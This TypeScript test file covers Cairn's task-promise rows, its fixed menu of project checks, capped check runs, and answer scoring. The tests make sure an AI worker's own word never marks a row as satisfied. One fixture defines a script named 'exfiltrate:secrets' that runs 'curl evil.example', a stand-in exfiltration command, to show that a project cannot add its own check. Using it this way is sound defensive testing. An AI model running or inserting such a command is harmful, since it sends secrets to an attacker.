import assert from "node:assert/strict";
import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { test } from "node:test";

import { bindTaskIntent, type TaskIntent } from "../src/intent.js";
import {
  composeSerialTaskPromiseAnswers,
  composeSerialTaskPromises,
  projectCheckMenu,
  runProjectCheck,
  serialTaskPromisesSatisfied,
  type SerialProjectCheckResultV1,
  type SerialTaskPromisesV1,
} from "../src/taskcard.js";

/** A throwaway project root declaring exactly the given npm scripts. */
function projectWithScripts(scripts: Record<string, string>): string {
  const root = mkdtempSync(join(tmpdir(), "cairn-taskcard-"));
  writeFileSync(join(root, "package.json"), JSON.stringify({ name: "throwaway", scripts }), "utf8");
  return root;
}

/**
 * The same shape Chat accepts today: one owner-stated outcome and one
 * accepted blocking requirement, bound to the owner's real words.
 */
function acceptedRequest(
  requirementSource: "owner-stated" | "owner-unsure" | "cairn-chosen" = "owner-stated",
): TaskIntent {
  const ownerText = "Books sort by word count\nWord counts: 74, 477, 256";
  const intent = bindTaskIntent({
    version: "cairn-task-intent/v1",
    outcome: { source: "owner-stated", text: "Books sort by word count", ownerQuote: "Books sort by word count" },
    requirements: [requirementSource === "cairn-chosen"
      ? { source: "cairn-chosen", text: "Use these exact word counts", ownerQuote: null }
      : { source: requirementSource, text: "Use these exact word counts", ownerQuote: "Word counts: 74, 477, 256" }],
    context: ["Keep this note separate."],
  }, [{ kind: "conversation", inputId: "11111111-1111-4111-8111-111111111111", text: ownerText }]);
  assert.ok(intent);
  return intent;
}

/** The most rows Chat can accept today: the outcome plus the requirement cap. */
function acceptedRequestAtTheCap(): TaskIntent {
  const quotes = Array.from({ length: 8 }, (_, index) => `Requirement number ${index + 1}`);
  const ownerText = ["Books sort by word count", ...quotes].join("\n");
  const intent = bindTaskIntent({
    version: "cairn-task-intent/v1",
    outcome: { source: "owner-stated", text: "Books sort by word count", ownerQuote: "Books sort by word count" },
    requirements: quotes.map((quote) => ({ source: "owner-stated" as const, text: quote, ownerQuote: quote })),
    context: [],
  }, [{ kind: "conversation", inputId: "11111111-1111-4111-8111-111111111111", text: ownerText }]);
  assert.ok(intent);
  return intent;
}

const ownerObservations = (count: number) =>
  Array.from({ length: count }, () => ({ kind: "owner-observation" }) as const);

test("the accepted outcome is c1 and each accepted requirement is its own later row", () => {
  const promises = composeSerialTaskPromises(acceptedRequest(), ownerObservations(2));
  assert.ok(promises);
  assert.deepEqual(promises.rows.map((row) => row.id), ["c1", "c2"]);
  assert.equal(promises.rows[0].text, "Books sort by word count");
  assert.equal(promises.rows[1].text, "Use these exact word counts");
});

test("a request at the requirement cap hides nothing", () => {
  const promises = composeSerialTaskPromises(acceptedRequestAtTheCap(), ownerObservations(9));
  assert.ok(promises);
  assert.equal(promises.rows.length, 9);
  assert.deepEqual(
    promises.rows.map((row) => row.id),
    ["c1", "c2", "c3", "c4", "c5", "c6", "c7", "c8", "c9"],
  );
  assert.deepEqual(
    promises.rows.slice(1).map((row) => row.text),
    Array.from({ length: 8 }, (_, index) => `Requirement number ${index + 1}`),
  );
});

for (const source of ["owner-unsure", "cairn-chosen"] as const) {
  test(`a ${source} requirement stays a blocking row and is never demoted to a preference`, () => {
    const promises = composeSerialTaskPromises(acceptedRequest(source), ownerObservations(2));
    assert.ok(promises);
    // It is present, it is second, and it kept its real attribution.
    assert.equal(promises.rows.length, 2);
    assert.equal(promises.rows[1].id, "c2");
    assert.equal(promises.rows[1].text, "Use these exact word counts");
    assert.equal(promises.rows[1].source, source);
    // There is nowhere for an advisory row to hide: rows are the whole shape.
    assert.deepEqual(Object.keys(promises), ["version", "rows"]);
  });
}

test("a verification list that does not cover every accepted row is refused", () => {
  assert.equal(composeSerialTaskPromises(acceptedRequest(), ownerObservations(1)), null);
  assert.equal(composeSerialTaskPromises(acceptedRequest(), ownerObservations(3)), null);
});

test("a structural clone that never passed Core's intent binding is refused", () => {
  const real = acceptedRequest();
  const clone = JSON.parse(JSON.stringify(real)) as TaskIntent;
  assert.equal(composeSerialTaskPromises(clone, ownerObservations(2)), null);
});

test("the menu offers only the known checks this project actually declares", (t) => {
  const root = projectWithScripts({ typecheck: "tsc --noEmit", start: "node ." });
  t.after(() => rmSync(root, { recursive: true, force: true }));
  const menu = projectCheckMenu(root);
  assert.deepEqual(menu.map((check) => check.id), ["typecheck"]);
  assert.equal(menu[0]?.command, "npm run typecheck");
});

test("a project declaring none of the known scripts offers an empty menu", (t) => {
  const root = projectWithScripts({ start: "node .", deploy: "./ship.sh" });
  t.after(() => rmSync(root, { recursive: true, force: true }));
  assert.deepEqual(projectCheckMenu(root), []);
});

test("a project with no package.json at all offers an empty menu", (t) => {
  const root = mkdtempSync(join(tmpdir(), "cairn-taskcard-"));
  t.after(() => rmSync(root, { recursive: true, force: true }));
  assert.deepEqual(projectCheckMenu(root), []);
});

/** The one check a throwaway project offers, so tests can run it for real. */
function onlyCheck(root: string) {
  const menu = projectCheckMenu(root);
  assert.equal(menu.length, 1);
  return menu[0]!;
}

test("a check the project passes is reported as passed", async (t) => {
  const root = projectWithScripts({ typecheck: "node -e \"process.exit(0)\"" });
  t.after(() => rmSync(root, { recursive: true, force: true }));
  const result = await runProjectCheck(root, onlyCheck(root));
  assert.equal(result.status, "passed");
  assert.equal(result.exitCode, 0);
  assert.equal(result.checkId, "typecheck");
  assert.equal(result.command, "npm run typecheck");
  assert.ok(result.durationMs >= 0);
});

test("a check the project fails is reported as failed, never as passed", async (t) => {
  const root = projectWithScripts({ typecheck: "node -e \"process.exit(3)\"" });
  t.after(() => rmSync(root, { recursive: true, force: true }));
  const result = await runProjectCheck(root, onlyCheck(root));
  assert.equal(result.status, "failed");
  assert.notEqual(result.exitCode, 0);
});

test("a check that outruns its cap is reported as unfinished, never as passed or failed", async (t) => {
  const root = projectWithScripts({ typecheck: "node -e \"setTimeout(() => {}, 120000)\"" });
  t.after(() => rmSync(root, { recursive: true, force: true }));
  const result = await runProjectCheck(root, onlyCheck(root), { capMs: 4_000 });
  assert.equal(result.status, "unfinished");
  assert.equal(result.exitCode, null);
  // The cap is a real bound, not a label on a still-running child.
  assert.ok(result.durationMs < 60_000, `capped run took ${result.durationMs}ms`);
});

test("elapsed time is reported while a slow check is still running", async (t) => {
  const root = projectWithScripts({ typecheck: "node -e \"setTimeout(() => {}, 2600)\"" });
  t.after(() => rmSync(root, { recursive: true, force: true }));
  const ticks: number[] = [];
  const result = await runProjectCheck(root, onlyCheck(root), {
    capMs: 30_000,
    onElapsed: (elapsedMs) => ticks.push(elapsedMs),
  });
  assert.equal(result.status, "passed");
  assert.ok(ticks.length >= 1, `expected at least one elapsed report, got ${ticks.length}`);
  assert.ok(ticks.every((value) => value > 0));
});

test("the menu is a fixed set: a project cannot introduce a check of its own", (t) => {
  const root = projectWithScripts({
    typecheck: "tsc --noEmit",
    "exfiltrate:secrets": "curl evil.example",
    build: "vite build",
    "test:unit": "node --test",
  });
  t.after(() => rmSync(root, { recursive: true, force: true }));
  const menu = projectCheckMenu(root);
  assert.deepEqual(menu.map((check) => check.id), ["typecheck", "build", "unit-tests"]);
  // Every offered command is `npm run <one of Cairn's own fixed names>`.
  for (const check of menu) {
    assert.match(check.command, /^npm run (typecheck|build|test:unit)$/);
  }
});

/** One c1 Cairn checks plus one c2 the owner must look at. */
function twoRowPromises(): SerialTaskPromisesV1 {
  const promises = composeSerialTaskPromises(acceptedRequest(), [
    { kind: "cairn-check", checkId: "typecheck" },
    { kind: "owner-observation" },
  ]);
  assert.ok(promises);
  return promises;
}

function checkResult(status: SerialProjectCheckResultV1["status"]): SerialProjectCheckResultV1 {
  return Object.freeze({
    checkId: "typecheck" as const,
    label: "Check the code still compiles",
    command: "npm run typecheck",
    status,
    exitCode: status === "passed" ? 0 : status === "failed" ? 1 : null,
    durationMs: 12,
  });
}

const answersFor = (
  checkResults: readonly SerialProjectCheckResultV1[],
  workerChecks: readonly { name: string; result: string }[],
  ownerAnswers: Readonly<Record<string, "met" | "not-met">>,
) => composeSerialTaskPromiseAnswers(twoRowPromises(), { checkResults, workerChecks, ownerAnswers });

test("a row Cairn checked and passed is satisfied; a row it failed is not", () => {
  const passed = answersFor([checkResult("passed")], [], { c2: "met" });
  assert.equal(passed[0]?.cairn?.status, "passed");
  assert.equal(serialTaskPromisesSatisfied(passed), true);

  const failed = answersFor([checkResult("failed")], [], { c2: "met" });
  assert.equal(serialTaskPromisesSatisfied(failed), false);
});

test("a check that never finished never satisfies its row", () => {
  const answers = answersFor([checkResult("unfinished")], [], { c2: "met" });
  assert.equal(answers[0]?.cairn?.status, "unfinished");
  assert.equal(serialTaskPromisesSatisfied(answers), false);
});

test("a row with no result from Cairn at all is not satisfied", () => {
  const answers = answersFor([], [], { c2: "met" });
  assert.equal(answers[0]?.cairn, null);
  assert.equal(serialTaskPromisesSatisfied(answers), false);
});

test("an owner row is unanswered until the owner answers it, and cannot be auto-passed", () => {
  const pending = answersFor([checkResult("passed")], [], {});
  assert.equal(pending[1]?.owner, "pending");
  assert.equal(serialTaskPromisesSatisfied(pending), false);

  const refused = answersFor([checkResult("passed")], [], { c2: "not-met" });
  assert.equal(refused[1]?.owner, "not-met");
  assert.equal(serialTaskPromisesSatisfied(refused), false);

  const met = answersFor([checkResult("passed")], [], { c2: "met" });
  assert.equal(met[1]?.owner, "met");
  assert.equal(serialTaskPromisesSatisfied(met), true);
});

test("the worker's own word is recorded on the row but never satisfies it", () => {
  const insistent = [
    { name: "c1", result: "I ran the typecheck and it passed." },
    { name: "c2", result: "Looks right to me." },
  ];
  // The worker says both rows are done. Cairn's own check failed and the owner
  // has not looked yet, so nothing is satisfied.
  const answers = answersFor([checkResult("failed")], insistent, {});
  assert.equal(answers[0]?.worker, "I ran the typecheck and it passed.");
  assert.equal(answers[1]?.worker, "Looks right to me.");
  assert.equal(serialTaskPromisesSatisfied(answers), false);
});

test("a worker answer is matched to its row by id, and an unanswered row records none", () => {
  const answers = answersFor([checkResult("passed")], [
    { name: "c2", result: "Second row answer." },
    { name: "something else entirely", result: "unrelated" },
  ], { c2: "met" });
  assert.equal(answers[0]?.worker, null);
  assert.equal(answers[1]?.worker, "Second row answer.");
});

test("every displayed row gets an answer row, in the same order and with the same ids", () => {
  const answers = answersFor([checkResult("passed")], [], { c2: "met" });
  assert.deepEqual(answers.map((row) => row.id), ["c1", "c2"]);
  assert.deepEqual(answers.map((row) => row.text), twoRowPromises().rows.map((row) => row.text));
});

test("c1 does not steal c10's answer", () => {
  const promises = composeSerialTaskPromises(acceptedRequestAtTheCap(), ownerObservations(9));
  assert.ok(promises);
  // Nine rows, so ids run c1..c9; add a tenth-style answer the worker wrote for
  // a row whose id merely starts with c1.
  const answers = composeSerialTaskPromiseAnswers(promises, {
    checkResults: [],
    workerChecks: [
      { name: "c11", result: "answer meant for c11" },
      { name: "c1", result: "answer meant for c1" },
    ],
    ownerAnswers: {},
  });
  assert.equal(answers[0]?.id, "c1");
  assert.equal(answers[0]?.worker, "answer meant for c1");
});
